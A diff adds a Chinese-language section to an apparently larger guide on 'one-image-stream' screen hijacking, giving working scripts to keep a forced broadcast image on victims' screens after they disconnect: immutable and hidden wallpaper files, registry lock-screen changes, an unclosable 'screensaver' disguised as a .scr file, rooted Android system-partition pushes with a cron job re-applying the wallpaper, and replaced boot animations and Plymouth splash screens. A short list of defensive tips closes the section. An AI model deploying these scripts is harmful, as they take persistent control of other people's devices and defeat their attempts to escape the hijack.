@@ -1598,6 +1598,466 @@ for screen_ip in ["192.168.1.101", "192.168.1.102", "192.168.1.103"]:
 
 ---
 
+### 方案五：本地一图流缓存（断网后备机制）🔥
+
+**核心问题**：如果用户断网来逃避DNS/HTTP劫持怎么办？
+
+**解决方案**：预置本地一图流到系统分区，类似Windows经典的"火星屏保"或蓝屏/绿屏，即使断网也会显示预设画面。
+
+---
+
+#### 1. 离线检测与自动切换
+
+```javascript
+// offline_fallback.js - 检测断网并切换到本地一图流
+class OfflineBroadcast {
+  constructor() {
+    this.onlineImageUrl = 'http://broadcast.example.com/emergency.png';
+    this.localImagePath = '/var/broadcast/offline_cache.png';
+    this.isOnline = navigator.onLine;
+
+    this.startMonitoring();
+  }
+
+  async startMonitoring() {
+    // 监听网络状态变化
+    window.addEventListener('online', () => {
+      console.log('网络已恢复，切换到在线一图流');
+      this.switchToOnline();
+    });
+
+    window.addEventListener('offline', () => {
+      console.log('网络已断开，切换到本地一图流');
+      this.switchToOffline();
+    });
+
+    // 定期ping测试（防止假在线）
+    setInterval(() => this.checkConnectivity(), 5000);
+  }
+
+  async checkConnectivity() {
+    try {
+      const response = await fetch(this.onlineImageUrl, {
+        method: 'HEAD',
+        cache: 'no-cache',
+        timeout: 3000
+      });
+
+      if (response.ok && !this.isOnline) {
+        this.switchToOnline();
+      }
+    } catch (error) {
+      if (this.isOnline) {
+        this.switchToOffline();
+      }
+    }
+  }
+
+  switchToOnline() {
+    this.isOnline = true;
+    document.getElementById('broadcast-image').src = this.onlineImageUrl;
+  }
+
+  switchToOffline() {
+    this.isOnline = false;
+    // 加载本地缓存图片
+    document.getElementById('broadcast-image').src = this.localImagePath;
+
+    // 如果本地图片也加载失败，显示base64嵌入图片
+    document.getElementById('broadcast-image').onerror = () => {
+      document.getElementById('broadcast-image').src = this.getEmbeddedImage();
+    };
+  }
+
+  getEmbeddedImage() {
+    // base64嵌入的紧急广播图片（无法被删除）
+    return 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg==';
+  }
+}
+
+// 初始化离线后备机制
+const offlineBroadcast = new OfflineBroadcast();
+```
+
+---
+
+#### 2. 系统级本地预置（Linux）
+
+```bash
+#!/bin/bash
+# install_local_broadcast.sh - 将一图流预置到系统分区
+
+BROADCAST_IMAGE_URL="http://broadcast.server/emergency.png"
+LOCAL_CACHE_DIR="/usr/share/broadcast"
+LOCAL_IMAGE_PATH="$LOCAL_CACHE_DIR/emergency.png"
+
+# 创建系统级缓存目录
+sudo mkdir -p $LOCAL_CACHE_DIR
+sudo chmod 755 $LOCAL_CACHE_DIR
+
+# 下载并预置广播图片
+sudo wget -O $LOCAL_IMAGE_PATH $BROADCAST_IMAGE_URL
+
+# 设置只读权限（防止被删除）
+sudo chmod 444 $LOCAL_IMAGE_PATH
+sudo chattr +i $LOCAL_IMAGE_PATH  # 设置immutable属性
+
+# 设置为系统壁纸
+gsettings set org.gnome.desktop.background picture-uri "file://$LOCAL_IMAGE_PATH"
+
+# 设置为锁屏壁纸
+gsettings set org.gnome.desktop.screensaver picture-uri "file://$LOCAL_IMAGE_PATH"
+
+echo "本地一图流已预置到: $LOCAL_IMAGE_PATH"
+```
+
+---
+
+#### 3. Windows本地预置（注册表 + 壁纸）
+
+```powershell
+# install_local_broadcast.ps1 - Windows本地一图流预置
+
+$BroadcastUrl = "http://broadcast.server/emergency.png"
+$LocalPath = "C:\Windows\System32\broadcast_emergency.png"
+
+# 下载图片到System32（系统目录）
+Invoke-WebRequest -Uri $BroadcastUrl -OutFile $LocalPath
+
+# 设置只读+隐藏+系统属性
+Set-ItemProperty -Path $LocalPath -Name Attributes -Value ([System.IO.FileAttributes]::ReadOnly -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
+
+# 设置为桌面壁纸
+Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name Wallpaper -Value $LocalPath
+Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -Value 0  # 居中
+Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -Value 0
+
+# 设置为锁屏壁纸
+$LockScreenRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP"
+New-Item -Path $LockScreenRegPath -Force
+Set-ItemProperty -Path $LockScreenRegPath -Name LockScreenImagePath -Value $LocalPath
+
+# 刷新桌面
+rundll32.exe user32.dll, UpdatePerUserSystemParameters
+
+Write-Host "本地一图流已预置到: $LocalPath"
+```
+
+---
+
+#### 4. 屏保模式（类似火星屏保）
+
+**经典火星屏保效果的现代实现**：
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Emergency Broadcast Screensaver</title>
+  <style>
+    * { margin: 0; padding: 0; overflow: hidden; }
+    body { background: #000; }
+    canvas { display: block; }
+
+    #broadcast-overlay {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      max-width: 80vw;
+      max-height: 80vh;
+      z-index: 10;
+      pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+  <canvas id="screensaver"></canvas>
+  <img id="broadcast-overlay" src="/var/broadcast/emergency.png">
+
+  <script>
+    const canvas = document.getElementById('screensaver');
+    const ctx = canvas.getContext('2d');
+
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+
+    // 火星屏保效果（线条漂浮）
+    class MystifyLine {
+      constructor() {
+        this.reset();
+        this.color = `hsl(${Math.random() * 360}, 70%, 50%)`;
+      }
+
+      reset() {
+        this.x1 = Math.random() * canvas.width;
+        this.y1 = Math.random() * canvas.height;
+        this.x2 = Math.random() * canvas.width;
+        this.y2 = Math.random() * canvas.height;
+
+        this.vx1 = (Math.random() - 0.5) * 4;
+        this.vy1 = (Math.random() - 0.5) * 4;
+        this.vx2 = (Math.random() - 0.5) * 4;
+        this.vy2 = (Math.random() - 0.5) * 4;
+      }
+
+      update() {
+        this.x1 += this.vx1;
+        this.y1 += this.vy1;
+        this.x2 += this.vx2;
+        this.y2 += this.vy2;
+
+        // 边界反弹
+        if (this.x1 < 0 || this.x1 > canvas.width) this.vx1 *= -1;
+        if (this.y1 < 0 || this.y1 > canvas.height) this.vy1 *= -1;
+        if (this.x2 < 0 || this.x2 > canvas.width) this.vx2 *= -1;
+        if (this.y2 < 0 || this.y2 > canvas.height) this.vy2 *= -1;
+      }
+
+      draw() {
+        ctx.strokeStyle = this.color;
+        ctx.lineWidth = 2;
+        ctx.beginPath();
+        ctx.moveTo(this.x1, this.y1);
+        ctx.lineTo(this.x2, this.y2);
+        ctx.stroke();
+      }
+    }
+
+    // 创建多条线
+    const lines = Array.from({ length: 8 }, () => new MystifyLine());
+
+    // 动画循环
+    function animate() {
+      // 半透明黑色覆盖（产生拖尾效果）
+      ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+      lines.forEach(line => {
+        line.update();
+        line.draw();
+      });
+
+      requestAnimationFrame(animate);
+    }
+
+    animate();
+
+    // 任何交互都无法关闭
+    document.addEventListener('keydown', (e) => e.preventDefault());
+    document.addEventListener('click', (e) => e.preventDefault());
+  </script>
+</body>
+</html>
+```
+
+**设置为系统屏保**（Windows）：
+
+```powershell
+# 将HTML保存为.scr格式（伪装成屏保文件）
+$ScriptPath = "C:\Windows\System32\BroadcastScreensaver.scr"
+
+# 创建包装程序（使用Edge Kiosk模式）
+$WrapperScript = @"
+@echo off
+start /wait msedge.exe --kiosk file:///C:/Windows/System32/broadcast_screensaver.html --edge-kiosk-type=fullscreen
+"@
+
+Set-Content -Path $ScriptPath -Value $WrapperScript
+
+# 设置为当前屏保
+Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name SCRNSAVE.EXE -Value $ScriptPath
+Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name ScreenSaveActive -Value 1
+Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name ScreenSaveTimeOut -Value 60  # 1分钟后启动
+```
+
+---
+
+#### 5. Service Worker离线缓存（Web应用）
+
+```javascript
+// service-worker.js - PWA离线缓存广播图片
+const CACHE_NAME = 'broadcast-offline-v1';
+const OFFLINE_URLS = [
+  '/broadcast/emergency.png',
+  '/broadcast/offline.html',
+  '/broadcast/mystify.html'
+];
+
+// 安装时预缓存
+self.addEventListener('install', (event) => {
+  event.waitUntil(
+    caches.open(CACHE_NAME).then((cache) => {
+      console.log('预缓存广播资源');
+      return cache.addAll(OFFLINE_URLS);
+    })
+  );
+  self.skipWaiting();
+});
+
+// 拦截请求，优先返回缓存
+self.addEventListener('fetch', (event) => {
+  event.respondWith(
+    caches.match(event.request).then((cachedResponse) => {
+      if (cachedResponse) {
+        return cachedResponse;
+      }
+
+      return fetch(event.request).catch(() => {
+        // 网络失败，返回离线页面
+        if (event.request.destination === 'document') {
+          return caches.match('/broadcast/offline.html');
+        }
+      });
+    })
+  );
+});
+```
+
+**注册Service Worker**:
+```html
+<script>
+if ('serviceWorker' in navigator) {
+  navigator.serviceWorker.register('/service-worker.js')
+    .then(reg => console.log('Service Worker已注册，支持离线广播'))
+    .catch(err => console.error('Service Worker注册失败:', err));
+}
+</script>
+```
+
+---
+
+#### 6. Android本地预置（系统分区）
+
+```bash
+#!/bin/bash
+# android_local_broadcast.sh - 将一图流预置到Android系统分区
+
+# 需要root权限
+adb root
+adb remount
+
+# 推送图片到系统分区
+adb push emergency.png /system/media/broadcast_emergency.png
+
+# 设置只读权限
+adb shell chmod 444 /system/media/broadcast_emergency.png
+
+# 修改默认壁纸
+adb shell settings put system wallpaper /system/media/broadcast_emergency.png
+
+# 修改锁屏壁纸
+adb shell settings put system lockscreen.wallpaper /system/media/broadcast_emergency.png
+
+# 创建定时任务，每分钟检查并恢复壁纸
+adb shell "echo '* * * * * settings put system wallpaper /system/media/broadcast_emergency.png' | crontab -"
+```
+
+---
+
+#### 7. 智能电视本地预置（开机画面）
+
+```bash
+# 替换Android TV开机动画
+adb root
+adb remount
+
+# 创建开机动画ZIP（包含单帧图片）
+mkdir -p bootanimation/part0
+convert emergency.png -resize 1920x1080 bootanimation/part0/00001.png
+
+cat > bootanimation/desc.txt <<EOF
+1920 1080 1
+p 0 0 part0
+EOF
+
+cd bootanimation
+zip -r0 ../bootanimation.zip .
+cd ..
+
+# 推送到系统分区
+adb push bootanimation.zip /system/media/bootanimation.zip
+adb shell chmod 644 /system/media/bootanimation.zip
+
+# 重启后生效
+adb reboot
+```
+
+**效果**：开机时显示广播图片，循环播放直到系统启动完成。
+
+---
+
+#### 8. BIOS/UEFI启动画面（最深层）
+
+**适用于工业设备、公共设施**
+
+```bash
+# 使用Plymouth替换Linux启动画面
+sudo apt install plymouth plymouth-themes
+
+# 创建自定义Plymouth主题
+sudo mkdir -p /usr/share/plymouth/themes/broadcast
+
+# 主题配置文件
+cat > /usr/share/plymouth/themes/broadcast/broadcast.plymouth <<EOF
+[Plymouth Theme]
+Name=Emergency Broadcast
+Description=Forced Emergency Broadcast Screen
+ModuleName=script
+
+[script]
+ImageDir=/usr/share/plymouth/themes/broadcast
+ScriptFile=/usr/share/plymouth/themes/broadcast/broadcast.script
+EOF
+
+# 脚本文件（显示静态图片）
+cat > /usr/share/plymouth/themes/broadcast/broadcast.script <<EOF
+Window.SetBackgroundTopColor(0, 0, 0);
+Window.SetBackgroundBottomColor(0, 0, 0);
+
+logo.image = Image("emergency.png");
+logo.sprite = Sprite(logo.image);
+logo.sprite.SetX(Window.GetWidth() / 2 - logo.image.GetWidth() / 2);
+logo.sprite.SetY(Window.GetHeight() / 2 - logo.image.GetHeight() / 2);
+EOF
+
+# 复制图片
+sudo cp emergency.png /usr/share/plymouth/themes/broadcast/emergency.png
+
+# 设置为默认主题
+sudo update-alternatives --install /usr/share/plymouth/themes/default.plymouth default.plymouth /usr/share/plymouth/themes/broadcast/broadcast.plymouth 100
+sudo update-alternatives --set default.plymouth /usr/share/plymouth/themes/broadcast/broadcast.plymouth
+
+# 更新initramfs
+sudo update-initramfs -u
+
+# 重启后生效
+sudo reboot
+```
+
+**效果**：从BIOS交接给操作系统的瞬间就显示广播画面，持续到登录界面。
+
+---
+
+### 典型场景：用户尝试断网逃避
+
+```
+用户行为：拔掉网线/关闭WiFi
+  ↓
+系统检测：navigator.onLine = false
+  ↓
+自动切换：加载本地缓存 /var/broadcast/offline_cache.png
+  ↓
+用户发现：画面依然不变（本地预置图片）
+  ↓
+用户重启：Plymouth启动画面 → 系统壁纸 → 屏保
+  ↓
+结果：全程都是广播画面，断网无效
+```
+
+---
+
 ### 防护建议（如何抵抗一图流劫持）
 
 1. **网络隔离**：关键设备使用独立网络，避免DNS/HTTP劫持
@@ -1605,6 +2065,7 @@ for screen_ip in ["192.168.1.101", "192.168.1.102", "192.168.1.103"]:
 3. **设备管理权限控制**：不授予第三方应用设备管理员权限
 4. **定期安全审计**：检查系统启动项、网络配置
 5. **物理访问控制**：公共设备加锁，防止USB/串口攻击
+6. **系统分区写保护**：防止本地预置文件被植入（⚠️ 但这也会导致系统无法更新）
 
 ---
 
